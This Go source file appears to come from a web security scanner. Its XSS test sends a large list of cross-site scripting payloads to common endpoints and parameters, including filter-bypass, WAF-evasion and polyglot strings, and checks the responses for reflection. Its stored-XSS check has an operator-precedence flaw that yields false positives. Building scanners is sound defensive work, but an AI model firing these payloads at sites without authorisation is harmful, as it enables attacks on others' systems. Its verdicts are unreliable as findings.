package tests

import (
	"fmt"
	"io"
	"net/url"
	"strings"
	"time"

	"github.com/versaSecurityTest/internal/config"
)

// AdvancedXSSTest - Test exhaustivo de Cross-Site Scripting
type AdvancedXSSTest struct{}

// Run ejecuta tests completos de XSS
func (t *AdvancedXSSTest) Run(targetURL string, client HTTPClient, payloads *config.PayloadConfig) TestResult {
	result := TestResult{
		TestName:    "Advanced Cross-Site Scripting (XSS) Test",
		Status:      "Passed",
		Description: "No se detectaron vulnerabilidades XSS",
		Severity:    "None",
		Details:     []string{},
		Evidence:    []Evidence{},
	}

	// PAYLOADS EXHAUSTIVOS DE XSS
	xssPayloads := []string{
		// Basic script tags
		"<script>alert(1)</script>",
		"<script>alert('XSS')</script>",
		"<script>alert(\"XSS\")</script>",
		"<script>alert(String.fromCharCode(88,83,83))</script>",
		
		// Event handlers
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"<body onload=alert(1)>",
		"<iframe onload=alert(1)>",
		"<input onfocus=alert(1) autofocus>",
		"<select onfocus=alert(1) autofocus>",
		"<textarea onfocus=alert(1) autofocus>",
		"<keygen onfocus=alert(1) autofocus>",
		"<video onerror=alert(1)><source>",
		"<audio onerror=alert(1)><source>",
		"<details open ontoggle=alert(1)>",
		"<marquee onstart=alert(1)>",
		
		// JavaScript URLs
		"javascript:alert(1)",
		"javascript:alert('XSS')",
		"javascript:eval('alert(1)')",
		"javascript:setTimeout('alert(1)',1)",
		"javascript:setInterval('alert(1)',1)",
		
		// Data URLs
		"data:text/html,<script>alert(1)</script>",
		"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
		
		// Context breaking
		"'><script>alert(1)</script>",
		"\"><script>alert(1)</script>",
		"</script><script>alert(1)</script>",
		"</title><script>alert(1)</script>",
		"</textarea><script>alert(1)</script>",
		"</noscript><script>alert(1)</script>",
		
		// Filter bypass - case variations
		"<ScRiPt>alert(1)</ScRiPt>",
		"<SCRIPT>alert(1)</SCRIPT>",
		"<script>Alert(1)</script>",
		"<script>ALERT(1)</script>",
		
		// Filter bypass - comment variations
		"<script>/**/alert(1)/**/<//script>",
		"<script>eval/**/('alert(1)')</script>",
		"<script>a=alert;a(1)</script>",
		"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
		
		// Filter bypass - encoding
		"<script>&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;</script>",
		"<script>\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29</script>",
		"<script>\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029</script>",
		"<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">",
		
		// Filter bypass - URL encoding
		"%3Cscript%3Ealert(1)%3C/script%3E",
		"%3Cimg%20src=x%20onerror=alert(1)%3E",
		"%3Csvg%20onload=alert(1)%3E",
		
		// Filter bypass - double encoding
		"%253Cscript%253Ealert(1)%253C/script%253E",
		"%253Cimg%2520src=x%2520onerror=alert(1)%253E",
		
		// Filter bypass - Unicode
		"<script>＼u0061＼u006c＼u0065＼u0072＼u0074(1)</script>",
		"＜script＞alert(1)＜/script＞",
		
		// Filter bypass - NULL bytes
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		
		// Filter bypass - spaces
		"<script>alert(1)</script>",
		"<script\t>alert(1)</script>",
		"<script\n>alert(1)</script>",
		"<script\r>alert(1)</script>",
		"<script\f>alert(1)</script>",
		"<script\v>alert(1)</script>",
		
		// HTML5 specific
		"<svg><script>alert(1)</script></svg>",
		"<math><script>alert(1)</script></math>",
		"<video><script>alert(1)</script></video>",
		"<audio><script>alert(1)</script></audio>",
		"<canvas><script>alert(1)</script></canvas>",
		
		// Template injection
		"{{alert(1)}}",
		"${alert(1)}",
		"#{alert(1)}",
		"<%=alert(1)%>",
		"{{constructor.constructor('alert(1)')()}}",
		
		// CSS injection
		"<style>@import'javascript:alert(1)';</style>",
		"<style>body{background:url('javascript:alert(1)')}</style>",
		"<link rel=stylesheet href='javascript:alert(1)'>",
		
		// SVG payloads
		"<svg onload=alert(1)>",
		"<svg><animateTransform onbegin=alert(1)>",
		"<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
		"<svg><foreignObject><script>alert(1)</script></foreignObject>",
		
		// Meta refresh
		"<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
		
		// Form hijacking
		"<form action=javascript:alert(1)><input type=submit>",
		"<isindex action=javascript:alert(1) type=submit>",
		
		// Breaking out of attributes
		"\"autofocus onfocus=alert(1) x=\"",
		"'autofocus onfocus=alert(1) x='",
		"\"onmouseover=alert(1) x=\"",
		"'onmouseover=alert(1) x='",
		
		// WAF bypass techniques
		"<img/src=x onerror=alert(1)>",
		"<img src=x onerror=\\u0061lert(1)>",
		"<img src=x onerror=eval('\\x61lert(1)')>",
		"<img src=x onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,49,41))\">",
		
		// Long payload test
		"<img src=x onerror=alert(1) style=\"background:url('javascript:alert(2)')\">",
		
		// Polyglot payloads
		"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
		"'\"><img src=x onerror=alert(1)>",
		"\"><svg/onload=alert(1)>",
		"</script><svg/onload=alert(1)>",
	}

	// PARÁMETROS COMUNES PARA XSS
	xssParams := []string{
		"q", "search", "query", "s", "keyword", "term", "name", "title",
		"message", "comment", "content", "text", "data", "input", "value",
		"description", "note", "memo", "subject", "body", "field", "param",
		"username", "user", "email", "url", "link", "redirect", "callback",
		"ref", "return", "continue", "next", "page", "view", "display",
	}

	// ENDPOINTS COMUNES PARA XSS
	xssEndpoints := []string{
		"/search", "/contact", "/feedback", "/comment", "/review", "/forum",
		"/post", "/blog", "/news", "/article", "/profile", "/settings",
		"/api/search", "/api/comment", "/api/post", "/api/user",
		"/admin/search", "/admin/post", "/admin/comment",
	}

	var vulnerabilitiesFound int
	var totalTests int

	for _, endpoint := range xssEndpoints {
		for _, param := range xssParams {
			for _, payload := range xssPayloads {
				totalTests++
				
				// Test en parámetros GET
				testURL := fmt.Sprintf("%s%s?%s=%s", targetURL, endpoint, param, url.QueryEscape(payload))
				
				resp, err := client.Get(testURL)
				if err != nil {
					continue
				}
				defer resp.Body.Close()

				// Leer respuesta
				body, err := io.ReadAll(resp.Body)
				if err != nil {
					continue
				}
				responseText := string(body)

				// ANÁLISIS DE XSS
				xssVuln := t.analyzeXSSResponse(responseText, payload)
				
				if xssVuln.IsVulnerable {
					vulnerabilitiesFound++
					
					result.Evidence = append(result.Evidence, Evidence{
						Type:        "Cross-Site Scripting",
						URL:         testURL,
						Payload:     payload,
						StatusCode:  resp.StatusCode,
						Response:    xssVuln.Evidence,
						Description: xssVuln.Description,
						Severity:    xssVuln.Severity,
					})

					result.Details = append(result.Details,
						fmt.Sprintf("XSS VULNERABLE: %s?%s=%s - %s", endpoint, param, payload, xssVuln.Description))
				}

				// Rate limiting
				if totalTests%50 == 0 {
					time.Sleep(50 * time.Millisecond)
				}
			}
		}
	}

	// Evaluar resultados
	if vulnerabilitiesFound > 0 {
		result.Status = "Failed"
		result.Severity = "Critical"
		result.Description = fmt.Sprintf("CRÍTICO: Se detectaron %d vulnerabilidades XSS en %d tests realizados", vulnerabilitiesFound, totalTests)
	} else {
		result.Details = append(result.Details, fmt.Sprintf("Se realizaron %d tests exhaustivos de XSS sin detectar vulnerabilidades", totalTests))
	}

	return result
}

// XSSVulnerability estructura para análisis de XSS
type XSSVulnerability struct {
	IsVulnerable bool
	Description  string
	Evidence     string
	Severity     string
}

// analyzeXSSResponse analiza la respuesta en busca de XSS
func (t *AdvancedXSSTest) analyzeXSSResponse(responseText, payload string) XSSVulnerability {
	responseLower := strings.ToLower(responseText)
	payloadLower := strings.ToLower(payload)
	
	// DETECCIÓN DE REFLECTED XSS
	
	// Buscar payload exacto sin codificar
	if strings.Contains(responseText, payload) {
		return XSSVulnerability{
			IsVulnerable: true,
			Description:  "Reflected XSS - payload reflejado sin sanitización",
			Evidence:     fmt.Sprintf("Payload '%s' encontrado sin codificar en la respuesta", payload),
			Severity:     "Critical",
		}
	}

	// Buscar elementos peligrosos del payload
	dangerousElements := []string{
		"<script>", "</script>", "javascript:", "alert(", "onerror=",
		"onload=", "onfocus=", "onmouseover=", "onclick=", "eval(",
	}

	for _, element := range dangerousElements {
		if strings.Contains(payloadLower, strings.ToLower(element)) && strings.Contains(responseLower, strings.ToLower(element)) {
			return XSSVulnerability{
				IsVulnerable: true,
				Description:  fmt.Sprintf("Reflected XSS - elemento peligroso '%s' reflejado", element),
				Evidence:     fmt.Sprintf("Elemento peligroso '%s' del payload encontrado en la respuesta", element),
				Severity:     "High",
			}
		}
	}

	// Buscar patrones de script tags
	scriptPatterns := []string{
		"<script", "</script>", "<svg", "onload", "onerror", "javascript:",
	}

	reflectedElements := 0
	for _, pattern := range scriptPatterns {
		if strings.Contains(payloadLower, pattern) && strings.Contains(responseLower, pattern) {
			reflectedElements++
		}
	}

	if reflectedElements >= 2 {
		return XSSVulnerability{
			IsVulnerable: true,
			Description:  "Posible Reflected XSS - múltiples elementos del payload reflejados",
			Evidence:     fmt.Sprintf("%d elementos del payload encontrados en la respuesta", reflectedElements),
			Severity:     "Medium",
		}
	}

	// DETECCIÓN DE STORED XSS (análisis básico)
	// En un test real, esto requeriría hacer una segunda request para verificar persistencia
	if strings.Contains(payload, "<script>") && strings.Contains(responseText, "saved") ||
		strings.Contains(responseText, "stored") || strings.Contains(responseText, "posted") {
		return XSSVulnerability{
			IsVulnerable: true,
			Description:  "Posible Stored XSS - script almacenado en el servidor",
			Evidence:     fmt.Sprintf("Payload con script aparentemente almacenado: '%s'", payload),
			Severity:     "Critical",
		}
	}

	// DETECCIÓN DE DOM XSS (análisis básico)
	if strings.Contains(responseLower, "document.write") || 
		strings.Contains(responseLower, "innerhtml") ||
		strings.Contains(responseLower, "location.hash") ||
		strings.Contains(responseLower, "eval(") {
		
		// Si el payload también contiene código JavaScript
		if strings.Contains(payloadLower, "alert") || strings.Contains(payloadLower, "javascript:") {
			return XSSVulnerability{
				IsVulnerable: true,
				Description:  "Posible DOM XSS - código JavaScript en contexto DOM",
				Evidence:     fmt.Sprintf("Funciones DOM peligrosas detectadas con payload: '%s'", payload),
				Severity:     "High",
			}
		}
	}

	// Verificar si hay indicios de filtrado incompleto
	if strings.Contains(payload, "<script>") && 
		(strings.Contains(responseLower, "&lt;script&gt;") || strings.Contains(responseLower, "\\u003cscript\\u003e")) {
		return XSSVulnerability{
			IsVulnerable: false, // Bien filtrado
			Description:  "Payload XSS correctamente filtrado",
			Evidence:     "Script tag codificado correctamente",
			Severity:     "None",
		}
	}

	return XSSVulnerability{IsVulnerable: false}
}
